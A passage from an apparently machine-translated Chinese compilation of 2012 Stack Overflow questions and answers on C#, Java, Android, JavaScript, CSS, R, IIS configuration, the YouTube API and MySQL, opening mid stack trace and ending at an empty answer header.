        - try 2\DM.Installer\SchemaHandler.cs:line 100    
    at DM.Installer.InstallProgressPage.backgroundWorker1_DoWork(Object sender, DoWorkEventArgs e) in C:\Users\Administrator\Desktop\PIDirect_Access\Installer\PIDirectAccessInstaller64Bit
        - try 2\DM.Installer\InstallProgressPage.cs:line 404    
    at System.ComponentModel.BackgroundWorker.WorkerThreadStart(Object argument) 
```

非常感谢任何关于我做错了什么的帮助或建议。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:28:25.793

> 在 System.ComponentModel.BackgroundWorker.WorkerThreadStart（对象参数）

有你的问题。

此代码在 BackgroundWorker 线程上运行，该线程绝不是 STA。
而是在 UI 线程上执行此操作。

# algorithm - 用特定条件填充矩阵

> ID：13916886
> 
> 赞同：1
> 
> 时间：2012-12-17T15:20:20.793
> 
> 标签：algorithm, matrix, pseudocode

问题是什么算法可以找到填充大小为 N*M 的矩阵的可能性数量

这将包括从 1 到 N*M 的所有数字，从左到右，从上到下排序

例如：

对于 N = 2 , M = 3 数量为 4

1.  1 2 3

    4 5 6

2.  1 3 5

    2 4 6

3.  1 2 5

    3 4 6

4.  1 2 4

    3 5 6

我试图找出某种模式但没有成功，这是作业，我确实意识到在所有情况下，N*M 中的最大数字必须在 [N][M] 中，而最小的数字必须是在 [0][0] 中，非常感谢您的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T16:15:27.910

**你忘了：**

```
1 3 4
2 5 6 
```

**c#中的代码：**

```
 static int N = 5;
    static int M = 5;
    static int[,] Number;
    static int[] NumbersInRow;

    static int Put(int n)
    {
        if (n > N * M)
        {
            // If output of each solution is desired
            //for (int y = 0; y < N; y++)
            //{
            //    for (int x = 0; x < M; x++)
            //        Console.Write(Number[y, x] + "\t");

            //    Console.WriteLine();
            //}
            //Console.WriteLine();
            return 1;
        }

        int sum = 0;

        int numbersInLastRow = int.MaxValue;
        int currentRow = 0;
        while (currentRow < N)
        {
            int numbersInCurrentRow = NumbersInRow[currentRow];
            if (numbersInCurrentRow < numbersInLastRow && numbersInCurrentRow < M)
            {
                Number[currentRow, NumbersInRow[currentRow]] = n;
                NumbersInRow[currentRow]++;
                sum += Put(n + 1);
                NumbersInRow[currentRow]--;
                Number[currentRow, NumbersInRow[currentRow]] = 0;
            }
            numbersInLastRow = NumbersInRow[currentRow];
            currentRow++;
        }

        return sum;
    }

    static void Main(string[] args)
    {
        Number = new int[N, M];
        NumbersInRow = new int[N];
        Console.WriteLine(Put(1));
        Console.ReadLine();
    } 
```

**解释：**

从 1 开始按顺序将数字放在板上。当一个数字有多个正确的位置时，递归拆分并计算所有解决方案。

在不尝试所有可能的位置/使用回溯的情况下，我们如何知道数字的正确位置？**假设“-1th”行中有无​​限个数字，则可以将一个数字放在前一行有更多数字的任何非满行的第一个空位置。**就是这样。这样我们就永远不会犯错。

请注意，这是对称的 - 就像您始终可以将下一个数字放入第一行（如果它未满）一样，您也可以将其放入第一列。

解决方案的数量增长极快：

```
2x2 - 2
3x3 - 42
4x4 - 24024
5x5 - 701149020 
```

# javascript - ASP.Net 不显示数据库中的图像

> ID：13916890
> 
> 赞同：0
> 
> 时间：2012-12-17T15:20:27.490
> 
> 标签：javascript, asp.net, html, handler, httphandler

我正在使用处理程序在我的网页中显示来自数据库的图像。

我已经给出了处理程序的 url，并为其图像传递了类别代码。但是，如果没有从 db 中找到图像，那么我不想显示任何图像来代替该处理程序 url。

我的代码：我在中继器控件中使用下面的图像，如果从 db 中找不到图像，则不需要图像。

```
<img src="Webservice/AppServices.ashx?type=categoryimage&catid=<%# Eval("ProductCategorieId") %>" height="100" width="120" class="catimage" /> 
```

如何检查该网址并且不显示图像？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:26:29.000

像这样使用 onerror 事件：

```
<img src="MyHandler.ashx?id=myId" onerror="this.src='errorImage.png';" /> 
```

`this.src`应该指向一个现有的图像！

# html - HTML Divs 不是两行

> ID：13916895
> 
> 赞同：-2
> 
> 时间：2012-12-17T15:20:52.857
> 
> 标签：html, css

我已经提到了许多与垂直对齐相关的问题，`div`并尝试了各种选项，包括、`float:left`等。但没有提供所需的解决方案。`display:block``clear:both`

这是完整的代码[http://jsfiddle.net/Lijo/8Db9A/3/](http://jsfiddle.net/Lijo/8Db9A/3/)。如果我将 div 的百分比保持为 98%，它工作正常。有没有办法让它在 80% 的情况下工作？

注意：我正在寻找不使用的解决方案`clear`

![在此处输入图像描述](../Images/ca08179bfc7b376e91a4ffa85efcdf42.png)

CSS

```
 .errorMessageDiv
    {
        width: 80%;
        display: block;
        float: left;
        clear: both;
        color: #56300a;
        overflow: auto;
        border: 1px solid #b08b34;
        padding: 0 0 0 0;
        margin: 10px 0 10px 10px;
        font-weight: bold;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:28:53.783

如果您希望表单显示在消息 div 下，则必须`clear: left`在`.firstElement`div 上添加。不像`.errorMessageDiv`你现在正在做的那样

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:37:40.620

尽管这个问题有点令人困惑，但我认为您正在寻找类似的东西，我基本上已将其删除

```
display: block;
float: left; 
```

[http://jsfiddle.net/8Db9A/9/](http://jsfiddle.net/8Db9A/9/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-17T15:42:57.083

您的文本试图与错误消息在同一行，因为它自然是“内联”的，并且有空间可以容纳。我建议为表单的容器设置一个宽度，大到不适合 20% 的孔。这迫使它换行：

[http://jsfiddle.net/8Db9A/10/](http://jsfiddle.net/8Db9A/10/)

```
.filterElements {
  padding: 10px 5px 10px 5px;
  width: 70%;
} 
```

# java - 使用 Observer 和 Observable 解决应用程序

> ID：13916896
> 
> 赞同：3
> 
> 时间：2012-12-17T15:20:52.620
> 
> 标签：java, observable

我有一个应用程序，我需要用户 Observer 来解决。由于代码实现很长，我想总结一下这个问题。

我启动应用程序。

我有一个登录窗口，我可以在其中选择秘书或学生。

秘书可以为给定课程的学生添加学生、课程和结果。学生只能看到其结果。

我需要使用观察者，以便如果秘书登录到该应用程序的一个实例中并且学生登录到该应用程序的另一个实例中，当秘书在课程中为该学生添加结果时，该学生会立即在其列表中看到新课程及其结果。

数据是从 txt 文件中读取的。

我的解决方案。SecretWindow 是 Observer StudentWindow 是 Observer ResultRepositoryFile 是 Observable 对象

当我单击 AddButton 时，控制器将 Result(studentName, courseName, result) 添加到 ResultRepositoryFile。秘书窗口观察者看到，打印一条消息并保存包含 ResultRepositoryFile 的 txt 文件。

现在在 StudentWindow 中，我单击 RefreshButton，ResultRepositoryFile 从该窗口重新加载到列表中，显示新添加的 Result.class

这是正确的方法吗，因为我有疑问。

如何使用 Observer 同步同一应用程序的两个实例？

感谢您的阅读，希望您能帮助我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:31:52.207

如果您打算让多个人同时使用您的应用程序，您应该使用数据库，而不是文本文件。如果多人同时写入文本文件，文本文件可能会损坏。

我建议使用 MySQL 之类的关系数据库。

由于您的学生窗口有一个刷新按钮，您的学生窗口将始终从数据库中提取最新数据。

当秘书将结果添加到数据库时，数据库将锁定，并且不允许任何人访问该结果，并且只有在添加提交到数据库之后才能访问该结果。数据库允许在秘书添加结果的同时访问其他结果。

您不需要 Observed 和 Observable，除非您想通知学生秘书已将结果添加到数据库中。

编辑添加：

秘书窗口是Observed，而Observable是秘书添加到文本文件中的结果。

学生窗口根据 Observable 更新窗口。秘书窗口必须能够根据结果的学生 id 访问学生窗口实例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T15:44:18.650

我认为你有点热衷于使用观察者设计模式。假设你还没有阅读设计模式，你将如何实现它。这是我解决这个问题的方法。学生将添加一个标记结果和一个结果对象的关联当秘书为一个主题添加结果时，他会找到所有已登录的学生选择了哪个秘书要添加结果的主题，并简单地将结果标记标记为真（显然文本文件/数据库也需要更新）。当你不想点击数据库/文件只是为了获取结果是否被添加时，可能是因为一些性能因素。现在当学生刷新时他可以简单地从结果对象中获取该页面，而不是从数据库中获取。就个人而言，我更喜欢触发 ajax 调用（基本上是轮询）而不是刷新

# java - 外部类java中的while循环

> ID：13916897
> 
> 赞同：1
> 
> 时间：2012-12-17T15:21:03.833
> 
> 标签：java, while-loop, redirect

好吧，事情应该会奏效，但与往常一样，它们不会：D。也许我忽略了一些对于经验丰富的程序员来说显而易见的问题。

我主要做这样的事情

```
 ACProcess ACProcess = new ACProcess();
    new ACFrame(ACProcess); 
```

`ACFrame`只是一个`JFrame`包含所有`JPanels`. `ACProcess`将负责通过usb连接，使用jd2xx库访问控制器。我绝对需要在`while(true)`那里有一个循环（因为与访问控制器进行问答类型的通信）并且只是用方法“重定向”它，目前我正在测试它是否有效，但它没有。我的`ACProcess()`构造函数有一个这样的循环：

```
 while(true) {
        if(verify) {
            System.out.println(test);
            test++;
        }
        else {
            System.out.println("works");
        }
    } 
```

以及指导它的方法，例如：

```
 public void test() {
        verify=false;
    }

    public void test2() {
        verify=true;
    }

    public boolean verifyValue() {
        return verify;
    } 
```

我应该怎么做才能让这个循环运行？（我的编译器没有显示任何，`System.out.println()`所以我猜它不起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T16:04:02.520

Thomas 指导了我，正如我所预料的那样，一些更有经验的程序员知道而我不知道。在此示例中添加线程后 [http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Thread.html](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/Thread.html)

一切正常。谢谢你们的帮助。

# java - 在android中拆分文本文件

> ID：13916902
> 
> 赞同：-1
> 
> 时间：2012-12-17T15:21:14.407
> 
> 标签：java, android

我正在开发一个 android 应用程序，我需要它来读取文本文件。一旦它读取了我需要的文本文件`save certain parts`到数据库。文本文件包含以下内容：

```
Title - Hello
Date - 03/02/1982
Info - Information blablabla

Title - New title
Date - 04/05/1993
Info - New Info 
```

我认为我需要通过使用空白行将文本文件一分为二`separator`。然后我需要获取标题等个人信息并将其作为标题保存到数据库中。有没有办法做到这一点？我知道如何阅读所有的文本文件。我正在使用它来读取`complete`文本文件。

```
 TextView helloTxt = (TextView) findViewById(R.id.hellotxt);
    helloTxt.setText(readTxt());

}

private String readTxt() {

    InputStream inputStream = getResources().openRawResource(R.raw.hello);

    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

    int i;
    try {
        i = inputStream.read();
        while (i != -1) {
            byteArrayOutputStream.write(i);
            i = inputStream.read();
        }
        inputStream.close();
    } catch (IOException e) {
        // TODO Auto-generated catch block
        e.printStackTrace();
    }

    return byteArrayOutputStream.toString();
} 
```

我只是想知道这个分裂事件。谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:41:12.293

所以如果我理解你的问题是正确的，你会寻找在换行符处分割你的文本的东西。因此，您可以获取两个信息字段并将它们放入文本视图中。

看这篇文章：[Split Java String by New Line](https://stackoverflow.com/q/454908/1164919) 这将向您展示如何将文本分割成行。

如果你想分割没有空行的文本，请使用：

```
String.split("[\\r\\n]+") 
```

这也是由同一线程中的其他用户描述的。

祝你好运，
丹尼尔

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T15:53:47.780

尝试使用`Pattern.compile`：

```
 File sdcard = Environment.getExternalStorageDirectory();

    //Get the text file
    File file = new File(sdcard,"myaddress.txt");

    //Read text from file
    StringBuilder text = new StringBuilder();

    try {
        BufferedReader br = new BufferedReader(new FileReader(file));
        String line;

        while ((line = br.readLine()) != null) {
            text.append(line);
            text.append("####");
        }
    }
    catch (IOException e) {
        //You'll need to add proper error handling here
    }
System.out.println("text text text ====:: "+text.toString());

String your_string = text.toString();

Pattern pattern = Pattern.compile("####");
String[] strarray =pattern.split(your_string); 
```

**笔记 ：**

这对我来说是有效的

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-17T15:42:02.717

您可以将正则表达式与 Pattern 和 Matcher 一起使用：

```
 String inputString = "Title - Hello\n" //
        + "Date - 03/02/1982\n" //
        + "Info - Information blablabla\n" //
        + "Title - New title\n" //
        + "Date - 04/05/1993\n" //
        + "Info - New Info\n";

    Pattern myPattern = Pattern.compile("Title - (.*)\nDate - (.*)\nInfo - (.*)");
    Matcher m = myPattern.matcher(inputString);
    String title = "";
    String date = "";
    String info = "";

    while (m.find()) {
        title = m.group(1);
        date = m.group(2);
        info = m.group(3);
        System.out.println("Title : [" + title + "] Date : [" + date + "] Info : [" + info + "]");
    } 
```

此代码返回：

```
Title : [Hello] Date : [03/02/1982] Info : [Information blablabla]
Title : [New title] Date : [04/05/1993] Info : [New Info] 
```

我相信您可以找到更好的正则表达式，但我不是专家；）

# c# - 在导航属性上定义数据注释

> ID：13916903
> 
> 赞同：3
> 
> 时间：2012-12-17T15:21:17.853
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, entity-framework, entity-framework-4

我有一个 Person 类。一个人有名字和称呼。Salutation 是数据库中的另一个表（我继承了数据库）。

在 UI 中，我希望称呼是必填字段。这是我的模型的样子：

```
public partial class Person
    {
        public virtual string Id { get; set; }

        public virtual Nullable<long> SalutationId { get; set; }

        [Required]
        public virtual Salutation Salutation { get; set; }

        public virtual string FirstName { get; set; }

        [DisplayName("Last Name")]
        public virtual string LastName { get; set; }
    }

    public partial class Salutation
    {
        public virtual long Id { get; set; }

        public virtual string SalutationName { get; set; }

        public virtual string Status { get; set; }

        public virtual ICollection<Person> People { get; set; }
    } 
```

它是否正确？即使我输入了称呼，我仍然收到一个验证错误，上面写着“称呼是必填字段”。

所有这一切都开始于一个小时前，直到一切正常。

如果我有时间思考并且不赶最后期限，我会自己解决这个问题。奇怪的是压力对你的思想有什么影响。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:24:45.957

**简短回答：**问题出在您为称呼**进行所需验证的地方。**

您的称呼验证属性应该放在`Salutation model`.

**编辑：**除此之外，您的模型`public virtual`还在每个属性上使用访问修饰符。`virtual`如果我的模型不需要，我会删除。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-17T15:26:36.633

@ElYusubov 是正确的，但也：`Person.SalutationId`不应该`Nullable`

```
public partial class Person
{
  public virtual long SalutationId { get; set; }
  ... 
```

这意味着每个`Person`对象都必须有一个有效的`SalutationId`，这又意味着`Salutation`数据库中的相关记录。

# android - 如何在android应用程序上停止音频

> ID：13916905
> 
> 赞同：0
> 
> 时间：2012-12-17T15:21:30.130
> 
> 标签：android, audio

我想在按下返回或返回按钮时停止音频

```
public class buttonFour extends Activity{ 

    MediaPlayer mp;

    @Override 
    public void onCreate (Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.button4);

        MediaPlayer mp = MediaPlayer.create(this, R.raw.song);
        mp.start(); 
    }
} 
```

我尝试了以下方法：

```
@Override 
public void onPause () {
    if (mp != null){
        mp.pause();
        mp.stop();   
    }   
    super.onPause(); 
} 
```

但音乐继续播放

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-17T15:30:25.130

使您的 MediaPlayer 引用成为全局引用。

然后覆盖`onBackPressed()`

```
public class buttonFour extends Activity {
MediaPlayer mp;
    @Override
    public void onCreate (Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.button4);

        mp = MediaPlayer.create(this, R.raw.song);
        mp.start();
    }
}

@Override
public void onBackPressed ()
{
  if (mp != null)
    mp.stop();
  super.onBackPressed();
} 
```

编辑，虽然上面应该工作，如果不是你可以尝试这样的事情：

```
@Override
public void onPause ()
{
  if (mp != null)
  {
    mp.pause();
    mp.stop();
  }
  super.onPause();
} 
```

但是，一旦 Activity 离开屏幕或旋转更改，此代码将停止播放。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-17T19:25:17.623

您正在初始化内部的另一个本地`MediaPlayer`对象，这就是为什么实例变量永远不会被初始化，也永远不会暂停的原因。`mp``onCreate()`

只需通过替换以下行来使用实例变量：

```
MediaPlayer mp = MediaPlayer.create(this, R.raw.song); 
```

和

```
mp = MediaPlayer.create(this, R.raw.song); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T12:01:57.070

尝试使`MediaPlayer`对象成为全局对象......这对我来说适用于全局`MediaPlayer`对象。

接着

```
mp.stop(); 
```

# javascript - 使用测试的 javascript 表单验证

> ID：13916906
> 
> 赞同：-4
> 
> 时间：2012-12-17T15:21:30.577
> 
> 标签：javascript, validation, forms

我最近学习了这段代码，但是这段代码没有像预期的那样工作。它用于表单验证

```
function username_validation(name){
    var valid_name = /^[a-zA-Z0-9_]{5,30}$/;
    if(!valid_name.test(name)) 
     {         
         return false; 
     } 
     else 
     { 
         return true;
     } 

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-17T15:34:00.787

您必须将此函数挂钩到事件侦听器。像 ：

```
<form onsubmit="username_validation(this.usernameTextfield.value);"> 
```

因此，每次提交特定表单时都会触发此功能。你的功能没有问题。

该行：

```
var valid_name = /^[a-zA-Z0-9_]{5,30}$/; 
```

创建一个 RegExp 对象。

然后 ：

```
valid_name.test(name) 
```

检查`name`数学是否与`valid_name`模式。RegExp 有一个布尔方法，如果给定的字符串与 RegExp 模式匹配，则`test(s)`返回 true`s`

一个更好的写法是：

```
function validate(name) {
    var r=/^[a-zA-Z0-9_]{5,30}$/;
    return r.test(name);
} 
```

希望能帮助到你...

# r - 使用移动平均或内核平滑平滑二进制变量

> ID：13916909
> 
> 赞同：5
> 
> 时间：2012-12-17T15:21:57.513
> 
> 标签：r, smoothing

我有以下形式的数据：

```
x      y
0      0
0.01   1
0.03   0
0.04   1
0.04   0 
```

`x`从 0 到 1 是连续的，并且不等距且 y 是二进制的。

我想`y`使用 R 平滑 x 轴，但找不到合适的包。我发现的核平滑函数会在 x 的末端产生密度估计，`x`或者会在 x 的末端给出错误的估计，因为它们会在小于 0 和大于 1 的区域上进行平均。

我还想避免像 Loess givens 这样的线性平滑器，然后是`y`. 我见过的移动平均函数假设等距的 x 值。

你知道任何 R 函数可以平滑并且理想地具有带宽选择过程吗？我可以编写一个移动平均函数并进行交叉验证以确定带宽，但我更愿意找到一个经过审查的现有函数。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-17T15:51:59.697

我建议使用类似的东西

```
d <- data.frame(x,y) ## not absolutely necessary but good practice
library(mgcv)
m1 <- gam(y~s(x),family="binomial",data=d) 
```

这将（1）尊重数据的二进制性质（2）使用广义交叉验证进行自动平滑度（您的术语中的“带宽”）选择。

利用

```
plot(y~x, data=d)
pp <- data.frame(x=seq(0,1,length=101))
pp$y <- predict(m1,newdata=pp,type="response")
with(pp,lines(x,y)) 
```

或者

```
library(ggplot2)
ggplot(d,aes(x,y))+geom_smooth(method="gam",family=binomial) 
```

获得预测/绘制结果。

（我希望你的真实数据集有超过 5 个观察值......否则这将失败......）

# web-config - web.config ASP.NET IIS7.5 中的 httpCompression 覆盖

> ID：13916913
> 
> 赞同：9
> 
> 时间：2012-12-17T15:22:03.770
> 
> 标签：web-config, iis-7.5, http-compression, asp.net-4.5

我的 web.config 中有此代码，用于在 IIS 7.5 中运行的 ASP.NET 4.5 网站

```
<system.webServer>
  <urlCompression doStaticCompression="true" doDynamicCompression="true"
  dynamicCompressionBeforeCache="true" />
  <httpCompression>
    <scheme name="gzip" dll="%Windir%\system32\inetsrv\gzip.dll" 
    staticCompressionLevel="9" dynamicCompressionLevel="4"  />
  </httpCompression>
</system.webServer> 
```

（为了更好的阅读，我强制换行）

我想知道是否有一个空的（没有 directory="..." 和其他内部元素等）会导致问题，或者从 IIS applicationHost.config 正确读取本节的默认属性/元素

我在这里尝试做的只是在 web.config 中设置压缩和压缩比，而不覆盖或清除其他默认值。我可以从方案以及 web.config 中删除 name="gzip" dll="%Windir%\system32\inetsrv\gzip.dll" 并在方案标记中保留 staticCompressionLevel 和 dynamicCompressionLevel 吗？是否会从 applicationHost.config 读取这些属性

# asp.net - 会话变量/临时数据

> ID：13916916
> 
> 赞同：0
> 
> 时间：2012-12-17T15:22:27.400
> 
> 标签：asp.net, asp.net-mvc-3, session-variables

因此，在用户页面上，用户可以使用下拉菜单选择他们的姓名，然后单击“查看”以查看他们之前预订的假期列表。从这里他们可以选择“选择新的”，这将允许用户创建一个新的假期。这一切都很好，但是我希望用户名从原始下拉列表中存储并显示在创建页面中。而不是在每页上有 2 个单独的下拉菜单。

我努力了：

我在 Index.chtml 中的第一个下拉菜单

```
@Html.DropDownListFor(model => model.HList4DD.First().HolidayDate, new SelectList(Model.PList4DD, "Id", "Name", Model.currentPersonID), "--select--") 
```

我在创建视图上的第二个下拉菜单：

```
 @Html.DropDownListFor(model => model.PersonId, new SelectList(ViewBag.Id, "Value", "Text"),"---Select---") 
```

* * *

我想将其更改为先前选择的用户名，因此在获取我使用的索引时：

```
TempData["CurrentPersonID"] =currentPersonID; 
```

然后替换我的第二个下拉菜单，我尝试类似：

```
@TempData["CurrentPersonID"]

<div>
@Html.LabelFor(model => model.currentPersonID, "currentPersonID")
@Html.ValidationMessageFor(model => model.PersonId) 
</div> 
```

有什么建议么？谢谢

# youtube-api - 目标 C 的 YouTube API 有一个“？” （问号）在名称“videoId？：”中用于 GTLYouTubeResourceId

> ID：13916918
> 
> 赞同：3
> 
> 时间：2012-12-17T15:22:28.523
> 
> 标签：youtube-api

我真的相信这在某些时候有效，但是当它到达这里时它会抛出异常并崩溃：

```
GTLYouTubeResourceId *thisVideo = item.identifier;
NSString *myVidId = thisVideo.videoId; 
```

这是错误：

```
2012-12-17 10:13:02.494 STATS[21427:11603] *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[GTLYouTubeVideo videoId]: unrecognized selector sent to instance 0xc471500'
*** First throw call stack:
(0x1e15012 0x16b2e7e 0x1ea04bd 0x1e04bbc 0x1e0494e 0x6e11 0x4ae5a 0x16c66b0 0xde7035 0x1d98f3f 0x1d9896f 0x1dbb734 0x1dbaf44 0x1dbae1b 0x276f7e3 0x276f668 0x2ee65c 0x278d 0x26b5)
libc++abi.dylib: terminate called throwing an exception 
```

从 API 返回的 JSON 格式为 ? 在视频 ID 标题中

```
2012-12-17 10:20:46.476 STATS[21630:11603]      *****  YOUTUBe thisVideo GTLYouTubeVideo 0x8267fe0: {kind:"youtube#video" videoId?:"AAAAAAAA"} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-02T06:02:05.970

我遇到了同样的问题并通过这样做解决了它。显然，返回的 JSON 字符串中包含 videoId。

NSString *myVidId = [thisVideo.JSON objectForKey:@"videoId"];

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T17:16:10.717

在您之后大约一个小时，我遇到了完全相同的问题！看起来他们忘记将 videoId 映射到属性。如果您将 thisVideo 更改为 GTLYouTubeVideo 类，如下所示：

```
GTLYouTubeVideo *thisVideo = (GTLYouTubeVideo *)item.identifier; 
```

然后转到 GTLYouTube.m 文件并将 @"id", @"identifier" 更改为 @"videoId", @"identifier" 它将起作用。这可能不是官方方式，但他们没有提供任何关于将 YouTube 集成到应用程序中的文档，所以必须这样做！

希望能帮助到你

# java - 联系许可服务器

> ID：13916922
> 
> 赞同：3
> 
> 时间：2012-12-17T15:22:43.140
> 
> 标签：java, android, android-lvl

我现在正在尝试将我的应用程序发布 3 个小时，但我无法让许可证检查正常工作。

在我的`onCreate`方法中，我得到了这个代码：

```
// Try to use more data here. ANDROID_ID is a single point of attack.
String deviceId = Secure.getString(getContentResolver(), Secure.ANDROID_ID);
String pckName = getPackageName();

// Library calls this when it's done.
mLicenseCheckerCallback = new MyLicenseCheckerCallback();
// Construct the LicenseChecker with a policy.
mChecker = new LicenseChecker(this, new ServerManagedPolicy(this, new AESObfuscator(
    SALT, pckName, deviceId)), BASE64_PUBLIC_KEY);

mChecker.checkAccess(mLicenseCheckerCallback); 
```

回调看起来像这样

```
private class MyLicenseCheckerCallback implements LicenseCheckerCallback {
    public void allow(int policyReason) {
        if (isFinishing()) 
            return; // Don't update UI if Activity is finishing.
        // Should allow user access.
        Main.isLicensed = true;
    }

    public void dontAllow(int policyReason) {
        if (isFinishing())
            return; // Don't update UI if Activity is finishing.
        Main.isLicensed = false;
    }

    public void applicationError(int errorCode) {
        if (isFinishing())
            return; // Don't update UI if Activity is finishing.
        Main.isLicensed = false;
    }
} 
```

只有 dontAllow 方法被调用。响应码是 291。

在 logcat 中，我收到“联系许可服务器时出错”。

*   该应用程序已上传到开发人员控制台。

*   公钥是正确复制的（没有任何空格）。

*   手机（带有 Android 4.0.4 Stock 的三星 Galaxy S2）可以上网

有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-19T09:28:23.403

代码对我来说看起来不错。但我现在有一个类似的问题。你是否 ...

*   重新启动网络连接
*   重启了你的手机
*   清除google play store的数据（设置->应用->google play store）
*   清除 google play 服务的数据
*   使用您的发布者/测试帐户登录您的设备 Google Play 商店

让我知道，如果解决了问题。

谢谢 最良好的祝愿

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-30T16:29:43.503

我在处理扩展文件时也遇到了这个问题，除了更新扩展文件和清单版本#，我的应用程序没有任何变化。

我的应用程序花了一个多小时才最终找到并下载新的扩展文件。直到那时，它只是不断给出随机错误，如“联系许可服务器时出错”，然后它会说它下载了文件（但字节大小是 1 字节，所以它没有）并且文件验证会失败，等等

正如 Joda 在评论中所说，谷歌有时只是很慢。等待几个小时，然后重试。执行克里斯汀在她的回答中列出的步骤也会有所帮助，但可能只是您需要等待更长时间。

* * *

## 回答 #3

> 赞同：-3
> 
> 时间：2014-11-12T13:09:44.827

它的互联网问题。请用高速互联网测试它。

# iphone - HTML5 Sqlite 备份

> ID：13916924
> 
> 赞同：0
> 
> 时间：2012-12-17T15:22:48.813
> 
> 标签：iphone, ajax, html, sqlite, remote-backup

我正在使用 jqueryMobile（不使用 phonegap）创建一个离线 Web 应用程序。客户端一切正常，数据库运行良好，但我想知道**如何备份数据**。

该应用程序不打算公开，我为我创建的，出于个人目的，所以**备份和恢复数据对我来说很重要**。

你知道有什么解决办法吗？

我在想：

1 - 创建我本地 iphone 数据库的 sqlite 转储，然后通过 AJAX 将对象推送到托管在我的在线托管服务器上的 PHP 页面，该页面将详细说明它并将数据保存在 MYSQL 上。

2 - 使用 iCloud 或 Dropbox（但我不知道该怎么做）

你怎么看待这件事？我走错路了吗？

太感谢了

马可

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-17T18:04:24.723

我认为您的 APP 正在您的 Iphone 上运行。

在你的情况下，我会..

1) 运行 SELECT * FROM 2) 将该数据放入一个对象 3) 使用 Ajax 将对象发送到您的 PHP 4) 解析数据并将其转换为标准 SQL 并将其保存到您的磁盘

我确信还有很多其他“方法”可以做到这一点，但我确信这一定是一种肮脏的方法:)

# java - 使用jms实现缓存失效实用吗？

> ID：13916926
> 
> 赞同：3
> 
> 时间：2012-12-17T15:22:50.963
> 
> 标签：java, caching, jms

假设我在每台服务器上都有一个本地缓存，使用 LRU 缓存或类似的东西。如果我在一个节点上使对象无效，则应注意其他节点。我已经看到用 jgroups 实现了这一点。

我想知道使用 jms（比如说 ActiveMQ）的“缓存失效队列”是否适合该应用程序。不确定响应时间等等。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-17T15:35:02.900

这取决于您的限制，即您可以承受过时的读取多长时间（即缓存返回过时的数据）。

如果这根本没有什么坏处，JMS 是通知所有成员的一种很好且干净的方式，因为它很容易确保每个成员最终都收到“刷新”消息。

如果您需要确保立即刷新过时的数据，您可以使用 JMS 通过向游戏添加事务和请求/响应周期来协调刷新。但这意味着如果您不小心，您可能会遇到死锁或饥饿进程——这就是您必须为同步付出的代价。

如果这让您感到困扰，那么问题是您可以使用哪些其他技术来实现相同的结果。您可以使用 RMI 或套接字，但随后您将不得不重新发明轮子（这意味着您将花费大量时间来了解 JMS 的现状）。但这只会用另一种传输技术取代一种传输技术——它对同步问题没有帮助。

或者您可以使用支持集群的缓存。您可以尝试 Terracotta 的[Enterprise Ehcache](http://terracotta.org/documentation/enterprise-ehcache/get-started)，但在底层，它将使用类似的技术来保持缓存同步。最大的优势是 Ehcache 已经使用（=调试）多年了，所以你只会遇到众所周知的问题。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-18T08:05:51.207

> 我想知道使用 jms（比如说 ActiveMQ）的“缓存失效队列”是否适合该应用程序。

绝对地。JMS 增加了一些开销，但是如果您没有在第二次处理数千个事务，您将感觉不到它。Aaron 解释得很好，我只想补充一点，我们在几个应用程序中使用 JMS 进行缓存失效，并且它运行良好。您可能感兴趣的一些材料：

*   [Java 持久性/缓存](http://en.wikibooks.org/wiki/Java_Persistence/Caching#Cache_Coordination)
*   [无效的 Toplink 会话缓存](http://blog.enkitec.com/2011/04/invalidating-toplink-session-cache-to-avoid-stale-data/)

# python - Python 不正确的整数值：第 1 行的列 'id' 的 '(2L,)'

> ID：13916928
> 
> 赞同：1
> 
> 时间：2012-12-17T15:22:56.880
> 
> 标签：python, mysql

我使用 Python，我得到一个“不正确的整数值：'(2L,)' for column 'id' at row 1”

这就是我所做的：

```
for user in users:
            userID = self.selectQuery("SELECT COUNT(id) FROM user;")
            self.changeQuery("INSERT INTO user VALUES ('" + str(userID[0]) + "', '" + str(user) + "','','');")

def changeQuery (self, query):

    connection = MySQLdb.connect(self.mysql_host, self.mysql_user, self.mysql_password, self.mysql_db)
    cursor = connection.cursor()
    cursor.execute (query)
    connection.commit()
    cursor.close()
    connection.close() 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-17T15:24:32.677

